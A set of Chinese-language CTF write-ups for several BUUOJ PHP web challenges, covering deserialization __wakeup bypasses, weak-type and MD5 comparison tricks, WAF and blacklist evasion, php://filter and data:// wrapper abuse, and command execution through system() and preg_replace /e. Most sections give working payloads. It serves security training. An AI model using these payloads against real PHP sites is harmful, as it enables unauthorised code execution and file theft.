# [极客大挑战 2019]PHP 1

1. 一进入题目，就有页面提示我们“所以我有一个良好的备份网站的习惯”
2. 所以我们尝试着输入网站源码备份文件，看看能否访问

    常见的网站源码备份文件后缀:

    tar.gz，zip，rar，tar，bak，swp

    常见的网站源码备份文件名：

    web，website，backup，back，www，wwwroot，temp
3. 发现www.zip可以成功获得网站源码备份
4. 下载后，发现有3个php文件
5. 我们先访问一下 index.php文件，发现文件包含 class.php 文件 并且文件是get 传参，参数为 select

   unserialize 函数允许将序列化后的数据转换回原始的 PHP 对象或数据结构，并在必要时通过调用 __wakeup() 方法来执行一些额外的操作

   __wakeup() 是一个特殊的魔术方法，用于在对象从序列化状态被恢复时执行某些操作。开发者可以在这个方法中实现任何必要的初始化逻辑，例如重新连接到数据库、重新打开文件或执行其他必要的操作
6. 访问 class.php
```php
 <?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```
7. 设置两个私有变量 ，利用 __construct 构造函数 来进行一个一一对应的关系,之后__wakeup() 让 username 变量等于 guest

    在类结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username… password… ，退出函数。如果 username= admine 就会输出 flag 否则 失败。

    在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以我们要想办法绕过该函数， 并且在一开始我们要改变 username的赋值
>当成员属性数目大于实际数目时可绕过wakeup方法
8. 构造payload
```php
<?php
class Name{
    private $username = 'admine';
    private $password = '100';
}
$select = new Name();
$res=serialize(@$select);
echo $res
?> 
```
即O:4:"Name":2:{s:14:"%00Name%00username";s:6:"admine";s:14:"%00Name%00password";s:3:"100";}
8. 因为当成员属性数目大于实际数目时才可绕过wakeup

   所以我们要将 2 改为 3 或者 比二大的数字
9. ?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}

# [ACTF2020 新生赛]BackupFile 1

1. 题目有提示:Backup file,翻译成中文就是备份文件的意思
2. 扫描python3 dirsearch.py -u http://62b4c3e1-0c2e-4913-bbb0-f4c4dcf76ffb.node5.buuoj.cn:81/ -e*
3. 找到/index.php.bak的文件
4. 查看PHP代码
```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
if($key == $str) {
    echo $flag;
}

}
else {
    echo "Try to find out source file!";
} 
```
5. 是弱类型的比较题

   在PHP中:

   == 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行==比较时。则b只会截取前面的整数部分。即b转化成123

   所以，这里的a = = b是返回True

   所以这里我们只需要提供一个参数?key=123就可以拿到flag了

# [RoarCTF 2019]Easy Calc 1

## 知识点

我们知道PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

1.删除空白符

2.将某些字符转换为下划线（包括空格）

## 解

1. 查看源代码,访问calc.php
2. 尝试给num传参：发现只能传数字 而不能传字母
3. 那我们可以利用PHP的字符串解析特性来绕过WAF,在num前面加上空格 
4. 绕过num传参后，我们要读取他根目录下的文件
```url
calc.php? num=print_r(scandir('/'));    
```
5. 却发现他没有返回我们想要的答案,发现calc.php中,发现他把  ' '  引号给过滤掉了 ,那就用chr()绕过，chr(47)就是斜杠/     
```url
? num=print_r(scandir(chr(47))); 
```
6. 输入后可以浏览根目录下的文件，而其中的f1agg就是我们要读取的文件
```url
? num=print_r(file_get_contents('/flagg'));

其中/flagg 用chr进行绕过

? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 
```
7. 得到flag

# [BJDCTF2020]Easy MD5 1

1. 使用burp发现在响应头这边找到了select * from 'admin' where password=md5($pass,true)
2. 这里面password就是我们用户框中输入得东西。如果通过md5之后返回字符串是'or 1的话，形成一个永真条件，

   select * from 'admin' where password='  'or  '6...'
3. 可以用ffifdyop绕过，绕过原理是：

   ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6

   而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from 'admin' where password='' or '6xxxxx'，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。
4.  查看源码，我们发现有一个弱类型比较，也可以数组绕过

   ?a[]=1&b[]=2
```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
--> 
```
5. 得到
```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```
6. POST方式，传param1和param2两个参数，这两个参数还不能相等，但是md5转换后的值还要相等（0e开头）

   典型的md5碰撞嘛，这个是弱比较，所以可以用md5值为0e开头的来撞。这里提供一些md5以后是0e开头的值：

   QNKCDZO

   0e830400451993494058024219903391

   s878926199a

   0e545993274517709034328855841020

   s155964671a

   0e342768416822451524974117254469

   s214587387a

   0e848240448830537924465865611904

   s214587387a

   0e848240448830537924465865611904

   s878926199a

   0e545993274517709034328855841020

   s1091221200a

   0e940624217856561557816327384675
7. 在这里我们就用md5无法处理数组，然后都返回null，null=null然后就绕过了这个。

   param1[]=111&param2[]=222

# [ZJCTF 2019]NiZhuanSiWei 1

1. 打开靶机发现直接就是php
```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```
2. 我们需要get方式提交参数，text、file、password
```php
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
// 要求text不为空，这是肯定的，主要看下一句，file_get_contents($text,'r')==="welcome to the zjctf",从文件里读取字符串，还要和welcome to the zjctf相等
// 这时候就用到了我们的data:// 写入协议了
```
3. 构建第一个payload:`?text=data://text/plain,welcome to the zjctf`
4. 下面我们不能用flag.php来访问，因为被正则匹配，我们就拿不到反序列化后的password了。

   下一个我们就该反序列化password了，但是我们又看到了useless.php文件包含，在这之前我们需要先读取里面的源码，然后将password反序列化出来。

   于是我们构造第二个payload:`file=php://filter/read=convert.base64-encode/resource=useless.php`

   这时候你会得到一串base64的编码，然后我们解码就得到了源码 
```php
<?php 
 
class Flag{  //flag.php 
    public $file; 
    public function __tostring(){ 
        if(isset($this->file)){ 
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        } 
    } 
} 
?> 
```
5. 分析可知，flag 应该在 flag.php 中，但是直接访问得不到结果；__tostring当类被当成字符串的时候自动调用，考虑到存在echo $password，因此这题的反序列化利用点是这个。
```php
<?php 
 
class Flag{  //flag.php 
    public $file="flag.php"; 
    public function __tostring(){ 
        if(isset($this->file)){ 
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        } 
    } 
} 
$password=new Flag();
echo serialize($password);
?>  
```
6. 得到`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`
7. 重新构建payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`,得到flag

# [网鼎杯 2020 青龙组]AreUSerialz 1

## 基础知识

>PHP访问修饰符

**public**公共的,任何成员都可以访问

**private**私有的,只有自己可以访问

`绕过方式`:%00类名%00成员名

**protected**保护的,只有当前类的成员与继承该类的类才能访问

`绕过方式`:%00%00成员名

>PHP类

**class**创建类

>PHP关键字

**function**用于用户声明自定义函数

**$this->** 表示在类本身内部使用本类的属性或者方法

**isset**用来检测参数是否存在并且是否具有值

>PHP常见函数

**include()** 包含函数

**highlight_file()** 函数对文件进行语法高亮显示

**file_put_contents()** 函数把一个字符串写入文件中

**file_get_contents()** 函数把整个文件读入一个字符串中

**is_valid()** 检查对象变量是否已经实例化，即实例变量的值是否是个有效的对象

**strlen** 计算字符串长度

**ord** 用于返回 “S” 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串

>PHP魔法函数

**__construct()** 实例化对象时被调用

**__destruct()** 当删除一个对象或对象操作终止时被调用

## WP

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {                                                               //满足对象op=2,执行read读的操作
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {                                                                  //满足content<100即可绕过
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {                                      
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {                                              //利用ord函数 返回 “S” 的 ASCII值 s为字符串类型 S为16进制字符串数据类型,绕过方式%00转换为\00即可绕过
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {                                             //GET方式传参,参数是str,将传入的值转为字符串类型,将str参数放入到自定义函数is_valid里面进行反序列化操作

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
?>
```

### 第一种解法 突破ord函数限制

```php
<?php
  class FileHandler {
  protected $op = 2;
  protected $filename ='flag.php';         
 //题目中包含flag的文件
protected $content;

}
$bai = urlencode(serialize(new FileHandler)); 
//URL编码实例化后的类FileHandler序列化结果
$mao =str_replace('%00',"\\00",$bai);    
//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
$mao =str_replace('s','S',$mao);         
//str_replace函数查找变量mao里面的数值s并将其替换为S
echo $mao                                               
//打印结果
?>
```

序列化结果

O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D

构造payload

?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D

### 第二种解法 突破protected访问修饰符限制

>这个关键点是将受保护的对象转换成公共对象

```php
<?php
  class FileHandler {
  protected $op = 2;
  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
//php://filter伪协议
protected $content;

}
$baimao=serialize(new FileHandler());
//实例化并序列化类FileHandler
echo $baimao;
//打印结果
?>
```

序列化结果

O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}

删除乱码并减去相应长度

O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}

构造payload

?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}

回显结果

PD9waHAgJGZsYWc9J2ZsYWd7ZTI4NTdjODItMTliMi00MWE1LTg4MWUtZWNjMGM1ODgzZDVifSc7Cg==

base64解码

得到flag

# [网鼎杯 2020 朱雀组]phpweb 1

发现页面回显一直在变

抓包，查看能否得到更多的信息

发现index.php用post方式提交了两个参数，func和p,func=date&p=Y-m-d+h%3Ai%3As+a

我们尝试猜测这两个参数的关系，可以用最简单的 php函数 MD5 来进行检测`func=md5&p=123`

发先页面回显的内容就是MD5加密后的123

尝试 直接查看网站页面看能否成功`func=system&p=ls /`

system被过滤掉了

这里我们需要查看页面源代码，进行代码审计

在这里我们可以使用多种函数进行查看 例如：file_get_contents、highlight_file() ，show_source()等`func=file_get_contents&p=index.php`

```php
<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
?>
```

使用反序列化 

```php
<?php
  class Test{
     var p="ls /";
     var func="system";
     }
     <?php
$a=new Test();
echo serialize($a);
?>
```

构造payload`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}`

没有flag返回上一页面`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}`

发现还是没有flag的信息
>system(“find / -name flag”)：查找所有文件名匹配flag的文件

`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}`

直接读取flag`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`

这道题本质上是 我们要对黑名单进行一个绕过 所以在本关我们可以使用别的方法来达到获取flag的目的

php内的" \ "在做代码执行的时候，会识别特殊字符串，绕过黑名单`func=\system&p=find / -name flag*`

`func=\system&p=cat /tmp/flagoefiu4r93`

# [BJDCTF2020]ZJCTF，不过如此 1

## 知识点
1. php伪协议
2. preg_replace /e  代码执行漏洞

## WP

代码审计，GET传参，text 要为 “I have a dream”  ，file为next.php

构造payload:

?text=data://text/plain,I have a dream&&file=php://filter/read=convert.base64-encode/resource=next.php

得到next.php源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(                                   //修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {                             //这是一个动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

代码审计，要绕过正则匹配，然后执行eval()函数，而我们要执行eval()函数，就要通过getFlag()这个函数。

[参考](http://www.xinyueseo.com/websecurity/158.html)

\S*=${phpinfo()}

将上面输入会将phpinfo()当做php代码执行。通过上述方法调用getFlag()函数

payload: next.php?\S*=${getFlag()}&&cmd=phpinfo();

payload: next.php?\S*=${getFlag()}&&cmd=system('ls /');

payload:next.php?\S*=${getFlag()}&&cmd=system('cat /flag'); 




